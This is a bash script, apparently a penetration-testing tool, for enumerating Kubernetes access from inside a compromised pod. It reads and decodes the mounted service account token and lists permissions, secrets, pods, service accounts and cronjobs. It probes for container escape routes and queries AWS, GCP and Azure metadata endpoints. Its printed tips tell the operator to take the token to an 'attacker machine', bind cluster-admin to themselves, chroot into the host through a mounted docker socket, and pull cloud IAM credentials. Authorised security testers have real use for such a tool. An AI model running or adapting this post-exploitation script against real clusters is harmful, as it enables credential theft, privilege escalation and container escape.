#!/bin/bash

#=============================================================================
#  K8S-POD-ENUM - Kubernetes Enumeration from Inside a Pod/Container
#  For compromised containers or pods with mounted service account tokens
#  Author: Astik Rawat (ahrixia)
#  Usage: ./k8s-pod-enum.sh [--api-server <url>]
#=============================================================================

VERSION="1.0.0"

# Colors
RED='\033[0;91m'
GREEN='\033[0;92m'
YELLOW='\033[0;93m'
BLUE='\033[0;94m'
MAGENTA='\033[0;95m'
CYAN='\033[0;96m'
WHITE='\033[0;97m'
BOLD='\033[1m'
NC='\033[0m'

# Severity colors
CRITICAL='\033[1;91m'
HIGH='\033[0;91m'
MEDIUM='\033[0;93m'
LOW='\033[0;92m'
INFO='\033[0;96m'

# Default paths
SA_PATH="/var/run/secrets/kubernetes.io/serviceaccount"
TOKEN_PATH="$SA_PATH/token"
CA_PATH="$SA_PATH/ca.crt"
NS_PATH="$SA_PATH/namespace"

# API Server detection
API_SERVER=""
CURL_OPTS=""

print_banner() {
    echo -e "${GREEN}"
    cat << 'EOF'
    ██╗  ██╗ █████╗ ███████╗    ██████╗  ██████╗ ██████╗     ███████╗███╗   ██╗██╗   ██╗███╗   ███╗
    ██║ ██╔╝██╔══██╗██╔════╝    ██╔══██╗██╔═══██╗██╔══██╗    ██╔════╝████╗  ██║██║   ██║████╗ ████║
    █████╔╝ ╚█████╔╝███████╗    ██████╔╝██║   ██║██║  ██║    █████╗  ██╔██╗ ██║██║   ██║██╔████╔██║
    ██╔═██╗ ██╔══██╗╚════██║    ██╔═══╝ ██║   ██║██║  ██║    ██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║
    ██║  ██╗╚█████╔╝███████║    ██║     ╚██████╔╝██████╔╝    ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║
    ╚═╝  ╚═╝ ╚════╝ ╚══════╝    ╚═╝      ╚═════╝ ╚═════╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝
EOF
    echo -e "${NC}"
    echo -e "${CYAN}    In-Pod Kubernetes Enumeration v${VERSION} by Ahrixia${NC}"
    echo -e "${CYAN}    For compromised containers - LinPEAS Style${NC}"
    echo ""
}

print_section() {
    echo ""
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║${NC} ${BOLD}${WHITE}$1${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════════╝${NC}"
}

print_subsection() {
    echo ""
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${BLUE}▶${NC} ${BOLD}$1${NC}"
    echo -e "${BLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_finding() {
    local severity=$1
    local message=$2
    case $severity in
        "CRITICAL") echo -e "${CRITICAL}[!!!] ${message}${NC}" ;;
        "HIGH")     echo -e "${HIGH}[!!] ${message}${NC}" ;;
        "MEDIUM")   echo -e "${MEDIUM}[!] ${message}${NC}" ;;
        "LOW")      echo -e "${LOW}[+] ${message}${NC}" ;;
        "INFO")     echo -e "${INFO}[*] ${message}${NC}" ;;
    esac
}

print_tip() {
    echo -e "${GREEN}    └─➤ TIP: $1${NC}"
}

print_cmd() {
    echo -e "${CYAN}    └─➤ CMD: ${WHITE}$1${NC}"
}

print_error() {
    echo -e "${RED}[-] $1${NC}"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

# Check if we have required tools
check_tools() {
    print_section "TOOL CHECK"

    local tools_found=0

    if command -v kubectl &>/dev/null; then
        print_success "kubectl found"
        KUBECTL_AVAILABLE=true
        tools_found=1
    else
        print_error "kubectl not found"
        KUBECTL_AVAILABLE=false
    fi

    if command -v curl &>/dev/null; then
        print_success "curl found"
        CURL_AVAILABLE=true
        tools_found=1
    else
        print_error "curl not found"
        CURL_AVAILABLE=false
    fi

    if command -v wget &>/dev/null; then
        print_success "wget found"
        WGET_AVAILABLE=true
    else
        WGET_AVAILABLE=false
    fi

    if [ $tools_found -eq 0 ]; then
        print_error "No HTTP tools found. Cannot enumerate API."
        print_tip "Try: apt install curl OR download kubectl statically"
        exit 1
    fi
}

# Check service account token
check_sa_token() {
    print_section "SERVICE ACCOUNT TOKEN CHECK"

    if [ -f "$TOKEN_PATH" ]; then
        print_finding "CRITICAL" "Service Account token found!"
        echo -e "${INFO}Path:${NC} $TOKEN_PATH"

        TOKEN=$(cat "$TOKEN_PATH")
        echo -e "${INFO}Token (first 50 chars):${NC} ${TOKEN:0:50}..."

        # Decode JWT payload
        PAYLOAD=$(echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null)
        if [ -n "$PAYLOAD" ]; then
            print_subsection "Token Details (JWT Payload)"

            SA_NAME=$(echo "$PAYLOAD" | grep -o '"serviceaccount":{[^}]*}' | grep -o '"name":"[^"]*"' | cut -d'"' -f4)
            SA_NS=$(echo "$PAYLOAD" | grep -o '"namespace":"[^"]*"' | head -1 | cut -d'"' -f4)
            SA_UID=$(echo "$PAYLOAD" | grep -o '"serviceaccount":{[^}]*}' | grep -o '"uid":"[^"]*"' | cut -d'"' -f4)
            POD_NAME=$(echo "$PAYLOAD" | grep -o '"pod":{[^}]*}' | grep -o '"name":"[^"]*"' | cut -d'"' -f4)
            NODE_NAME=$(echo "$PAYLOAD" | grep -o '"node":{[^}]*}' | grep -o '"name":"[^"]*"' | cut -d'"' -f4)
            EXP=$(echo "$PAYLOAD" | grep -o '"exp":[0-9]*' | cut -d':' -f2)

            echo -e "${INFO}Service Account:${NC} ${GREEN}$SA_NAME${NC}"
            echo -e "${INFO}Namespace:${NC} ${GREEN}$SA_NS${NC}"
            echo -e "${INFO}Pod Name:${NC} $POD_NAME"
            echo -e "${INFO}Node Name:${NC} $NODE_NAME"
            echo -e "${INFO}Full Identity:${NC} system:serviceaccount:$SA_NS:$SA_NAME"

            if [ -n "$EXP" ]; then
                EXP_DATE=$(date -d "@$EXP" 2>/dev/null || date -r "$EXP" 2>/dev/null)
                echo -e "${INFO}Expires:${NC} $EXP_DATE"
            fi
        fi

        print_tip "Use this token to authenticate to the API server"
        print_cmd "export TOKEN=\$(cat $TOKEN_PATH)"
    else
        print_error "No service account token found at $TOKEN_PATH"
        print_tip "Token might be disabled or in a different location"

        # Check for other token locations
        if [ -f "/run/secrets/kubernetes.io/serviceaccount/token" ]; then
            print_finding "INFO" "Found token at /run/secrets/kubernetes.io/serviceaccount/token"
            TOKEN_PATH="/run/secrets/kubernetes.io/serviceaccount/token"
        fi
    fi

    if [ -f "$CA_PATH" ]; then
        print_success "CA certificate found at $CA_PATH"
    fi

    if [ -f "$NS_PATH" ]; then
        NAMESPACE=$(cat "$NS_PATH")
        print_success "Namespace: $NAMESPACE"
    fi
}

# Detect API server
detect_api_server() {
    print_section "API SERVER DETECTION"

    # Method 1: Environment variables
    if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
        API_SERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT:-443}"
        print_success "API Server from env: $API_SERVER"
    fi

    # Method 2: Default Kubernetes service
    if [ -z "$API_SERVER" ]; then
        API_SERVER="https://kubernetes.default.svc"
        print_finding "INFO" "Using default: $API_SERVER"
    fi

    # Test connectivity
    if [ "$CURL_AVAILABLE" = true ]; then
        if curl -sk --connect-timeout 3 "$API_SERVER/version" &>/dev/null; then
            print_success "API Server reachable"
            echo ""
            curl -sk "$API_SERVER/version" 2>/dev/null | head -20
        else
            print_error "Cannot reach API server"
        fi
    fi

    # Set curl options
    if [ -f "$CA_PATH" ]; then
        CURL_OPTS="--cacert $CA_PATH"
    else
        CURL_OPTS="-k"
    fi
}

# API call helper
api_call() {
    local endpoint=$1
    local token=$(cat "$TOKEN_PATH" 2>/dev/null)

    if [ "$CURL_AVAILABLE" = true ]; then
        curl -s $CURL_OPTS -H "Authorization: Bearer $token" "$API_SERVER$endpoint" 2>/dev/null
    elif [ "$WGET_AVAILABLE" = true ]; then
        wget -qO- --no-check-certificate --header="Authorization: Bearer $token" "$API_SERVER$endpoint" 2>/dev/null
    fi
}

# Check permissions using API
check_permissions_api() {
    print_section "PERMISSION ENUMERATION (API)"

    local token=$(cat "$TOKEN_PATH" 2>/dev/null)

    print_subsection "Self Subject Rules Review"

    # Create a SelfSubjectRulesReview
    local review=$(cat <<EOF
{
  "apiVersion": "authorization.k8s.io/v1",
  "kind": "SelfSubjectRulesReview",
  "spec": {
    "namespace": "$NAMESPACE"
  }
}
EOF
)

    local result=$(curl -s $CURL_OPTS -X POST \
        -H "Authorization: Bearer $token" \
        -H "Content-Type: application/json" \
        -d "$review" \
        "$API_SERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" 2>/dev/null)

    if echo "$result" | grep -q "resourceRules"; then
        print_success "Got permissions from API"

        # Parse and display permissions
        echo "$result" | grep -oP '"verbs":\[[^\]]*\]|"resources":\[[^\]]*\]|"apiGroups":\[[^\]]*\]' | head -50

        # Check for dangerous permissions
        if echo "$result" | grep -q '"create".*"pods/exec"\|"pods/exec".*"create"'; then
            print_finding "CRITICAL" "Can CREATE pods/exec!"
            print_tip "kubectl exec -it <pod> -- /bin/sh"
        fi

        if echo "$result" | grep -q '"secrets"'; then
            print_finding "CRITICAL" "Has access to secrets!"
        fi

        if echo "$result" | grep -q '"impersonate"'; then
            print_finding "CRITICAL" "Can impersonate!"
        fi
    else
        print_error "Could not get permissions via API"
        echo "$result" | head -10
    fi
}

# Check permissions using kubectl
check_permissions_kubectl() {
    print_section "PERMISSION ENUMERATION (kubectl)"

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        print_subsection "auth can-i --list"
        kubectl auth can-i --list 2>/dev/null

        # Analyze dangerous permissions
        local perms=$(kubectl auth can-i --list 2>/dev/null)

        print_subsection "Dangerous Permission Analysis"

        if echo "$perms" | grep -q "pods/exec.*create"; then
            print_finding "CRITICAL" "Can CREATE pods/exec - RCE possible!"
            print_cmd "kubectl exec -it <pod> -- /bin/sh"
        fi

        if echo "$perms" | grep -q "secrets.*get\|secrets.*list"; then
            print_finding "CRITICAL" "Can GET/LIST secrets!"
            print_cmd "kubectl get secrets -o yaml"
        fi

        if echo "$perms" | grep -q "pods.*create"; then
            print_finding "CRITICAL" "Can CREATE pods - escape possible!"
            print_tip "Create privileged pod to escape to node"
        fi

        if echo "$perms" | grep -qE "impersonate"; then
            print_finding "CRITICAL" "Can IMPERSONATE!"
            # Extract impersonation targets
            local targets=$(echo "$perms" | grep "impersonate" | awk '{print $3}')
            if [ -n "$targets" ] && [ "$targets" != "[]" ]; then
                echo -e "${INFO}Impersonation targets:${NC} $targets"
                print_cmd "kubectl auth can-i --list --as=system:serviceaccount:<ns>:<target>"
            fi
        fi

        if echo "$perms" | grep -q "cronjobs.*get\|cronjobs.*list"; then
            print_finding "MEDIUM" "Can access cronjobs"
            print_tip "Check cronjob SAs for privilege escalation"
        fi

        if echo "$perms" | grep -q "rolebindings.*create\|clusterrolebindings.*create"; then
            print_finding "CRITICAL" "Can CREATE rolebindings!"
            print_tip "Bind cluster-admin to yourself"
        fi
    else
        print_error "kubectl not available, use API method"
    fi
}

# Enumerate namespaces
enum_namespaces() {
    print_section "NAMESPACE ENUMERATION"

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        local ns=$(kubectl get namespaces -o jsonpath='{.items[*].metadata.name}' 2>/dev/null)
        if [ -n "$ns" ]; then
            print_success "Can list namespaces"
            for n in $ns; do
                if [[ "$n" == "kube-system" || "$n" == "kube-public" ]]; then
                    echo -e "  ${YELLOW}• $n${NC} (system)"
                else
                    echo -e "  ${GREEN}• $n${NC}"
                fi
            done
        else
            print_error "Cannot list namespaces"
        fi
    else
        local result=$(api_call "/api/v1/namespaces")
        if echo "$result" | grep -q '"items"'; then
            print_success "Can list namespaces (API)"
            echo "$result" | grep -oP '"name":"[^"]*"' | cut -d'"' -f4 | head -20
        fi
    fi
}

# Enumerate pods
enum_pods() {
    print_section "POD ENUMERATION"

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        print_subsection "Pods in current namespace ($NAMESPACE)"
        kubectl get pods -o wide 2>/dev/null || print_error "Cannot list pods"

        print_subsection "Pods in all namespaces"
        kubectl get pods --all-namespaces -o wide 2>/dev/null | head -30 || print_error "Cannot list all pods"
    else
        local result=$(api_call "/api/v1/namespaces/$NAMESPACE/pods")
        if echo "$result" | grep -q '"items"'; then
            print_success "Can list pods (API)"
            echo "$result" | grep -oP '"name":"[^"]*"' | head -20
        fi
    fi
}

# Enumerate secrets
enum_secrets() {
    print_section "SECRET ENUMERATION"

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        local secrets=$(kubectl get secrets 2>/dev/null)
        if [ -n "$secrets" ]; then
            print_finding "CRITICAL" "Can list secrets!"
            echo "$secrets"
            print_cmd "kubectl get secret <name> -o yaml"
            print_cmd "kubectl get secret <name> -o jsonpath='{.data}' | base64 -d"
        else
            print_error "Cannot list secrets in current namespace"

            # Try all namespaces
            secrets=$(kubectl get secrets --all-namespaces 2>/dev/null | head -20)
            if [ -n "$secrets" ]; then
                print_finding "CRITICAL" "Can list secrets cluster-wide!"
                echo "$secrets"
            fi
        fi
    else
        local result=$(api_call "/api/v1/namespaces/$NAMESPACE/secrets")
        if echo "$result" | grep -q '"items"'; then
            print_finding "CRITICAL" "Can list secrets (API)!"
            echo "$result" | grep -oP '"name":"[^"]*"' | head -10
        fi
    fi
}

# Enumerate service accounts
enum_serviceaccounts() {
    print_section "SERVICE ACCOUNT ENUMERATION"

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        print_subsection "Service Accounts in $NAMESPACE"
        kubectl get serviceaccounts 2>/dev/null || print_error "Cannot list SAs"

        print_subsection "Service Accounts (all namespaces)"
        kubectl get serviceaccounts --all-namespaces 2>/dev/null | head -30 || print_error "Cannot list all SAs"
    fi
}

# Enumerate cronjobs
enum_cronjobs() {
    print_section "CRONJOB ENUMERATION"

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        local cronjobs=$(kubectl get cronjobs --all-namespaces 2>/dev/null)
        if [ -n "$cronjobs" ]; then
            print_success "Can list cronjobs"
            echo "$cronjobs"

            print_subsection "CronJob Service Accounts"
            kubectl get cronjobs --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.jobTemplate.spec.template.spec.serviceAccountName}{"\n"}{end}' 2>/dev/null

            print_tip "CronJobs may run with privileged SAs - check for privesc"
        fi
    fi
}

# Check for container escape vectors
check_escape_vectors() {
    print_section "CONTAINER ESCAPE VECTORS"

    print_subsection "Checking host mounts"

    # Check /proc/1/root
    if [ -d "/proc/1/root" ] && [ "$(ls -la /proc/1/root 2>/dev/null | wc -l)" -gt 3 ]; then
        print_finding "CRITICAL" "/proc/1/root accessible - possible container escape!"
    fi

    # Check docker socket
    if [ -S "/var/run/docker.sock" ]; then
        print_finding "CRITICAL" "Docker socket mounted!"
        print_tip "docker run -v /:/host --privileged alpine chroot /host"
    fi

    # Check for privileged mode
    if [ -w "/sys/kernel/mm" ] 2>/dev/null; then
        print_finding "CRITICAL" "Container may be privileged!"
    fi

    # Check capabilities
    if command -v capsh &>/dev/null; then
        print_subsection "Capabilities"
        capsh --print 2>/dev/null
    elif [ -f "/proc/self/status" ]; then
        print_subsection "Capabilities (from /proc)"
        grep -i cap /proc/self/status
    fi

    # Check if we can access host filesystem
    print_subsection "Host Filesystem Access"

    for mount in /host /hostfs /rootfs /node-root; do
        if [ -d "$mount" ]; then
            print_finding "CRITICAL" "Host filesystem mounted at $mount!"
            print_tip "Access host files: ls $mount/etc/shadow"
        fi
    done

    # Check for hostPID
    if [ -d "/proc/1/root/proc" ] && [ "$(ls /proc | wc -l)" -gt 100 ]; then
        print_finding "HIGH" "Possible hostPID - can see host processes"
    fi

    # Check for hostNetwork
    if ip addr 2>/dev/null | grep -q "docker0\|cni0\|flannel"; then
        print_finding "MEDIUM" "May have hostNetwork access"
    fi
}

# Check cloud metadata
check_cloud_metadata() {
    print_section "CLOUD METADATA CHECK"

    print_subsection "AWS Metadata"
    local aws_meta=$(curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null)
    if [ -n "$aws_meta" ]; then
        print_finding "HIGH" "AWS metadata accessible!"
        echo "$aws_meta" | head -10
        print_tip "Get credentials: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    fi

    print_subsection "GCP Metadata"
    local gcp_meta=$(curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null)
    if [ -n "$gcp_meta" ]; then
        print_finding "HIGH" "GCP metadata accessible!"
        print_tip "Get token: curl -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
    fi

    print_subsection "Azure Metadata"
    local azure_meta=$(curl -s --connect-timeout 2 -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
    if [ -n "$azure_meta" ]; then
        print_finding "HIGH" "Azure metadata accessible!"
    fi
}

# Check network access
check_network() {
    print_section "NETWORK ENUMERATION"

    print_subsection "Network Interfaces"
    ip addr 2>/dev/null || ifconfig 2>/dev/null || cat /proc/net/dev

    print_subsection "Listening Ports"
    ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null

    print_subsection "Internal Services"
    if command -v nslookup &>/dev/null; then
        nslookup kubernetes.default.svc 2>/dev/null
    elif command -v host &>/dev/null; then
        host kubernetes.default.svc 2>/dev/null
    fi

    # Check common internal services
    for svc in kubernetes.default.svc kube-dns.kube-system.svc metrics-server.kube-system.svc; do
        if ping -c1 -W1 $svc &>/dev/null; then
            echo -e "${GREEN}[+] $svc reachable${NC}"
        fi
    done
}

# Generate summary
generate_summary() {
    print_section "SUMMARY & NEXT STEPS"

    echo -e "${BOLD}Recommended Actions:${NC}"
    echo ""

    local priority=1

    if [ -f "$TOKEN_PATH" ]; then
        echo -e "${CRITICAL}[$priority] EXTRACT TOKEN FOR EXTERNAL USE${NC}"
        echo "    cat $TOKEN_PATH"
        echo "    # Use with kubectl --token=<token> from attacker machine"
        ((priority++))
    fi

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        local perms=$(kubectl auth can-i --list 2>/dev/null)

        if echo "$perms" | grep -q "impersonate"; then
            echo -e "${CRITICAL}[$priority] IMPERSONATION AVAILABLE${NC}"
            echo "    kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>"
            ((priority++))
        fi

        if echo "$perms" | grep -q "pods/exec"; then
            echo -e "${CRITICAL}[$priority] POD EXEC AVAILABLE${NC}"
            echo "    kubectl exec -it <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token"
            ((priority++))
        fi

        if echo "$perms" | grep -q "secrets"; then
            echo -e "${CRITICAL}[$priority] SECRET ACCESS AVAILABLE${NC}"
            echo "    kubectl get secrets -o yaml"
            ((priority++))
        fi

        if echo "$perms" | grep -q "cronjobs"; then
            echo -e "${MEDIUM}[$priority] CHECK CRONJOBS FOR PRIVESC${NC}"
            echo "    kubectl get cronjob -o yaml | grep serviceAccount"
            ((priority++))
        fi
    fi

    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}                    Enumeration Complete                           ${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════${NC}"
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --api-server|-a)
            API_SERVER="$2"
            shift 2
            ;;
        --help|-h)
            echo "Usage: $0 [--api-server <url>]"
            echo ""
            echo "Run from inside a Kubernetes pod to enumerate access"
            exit 0
            ;;
        *)
            shift
            ;;
    esac
done

# Main
main() {
    print_banner

    check_tools
    check_sa_token
    detect_api_server

    if [ "$KUBECTL_AVAILABLE" = true ]; then
        check_permissions_kubectl
    else
        check_permissions_api
    fi

    enum_namespaces
    enum_pods
    enum_secrets
    enum_serviceaccounts
    enum_cronjobs
    check_escape_vectors
    check_cloud_metadata
    check_network
    generate_summary
}

main
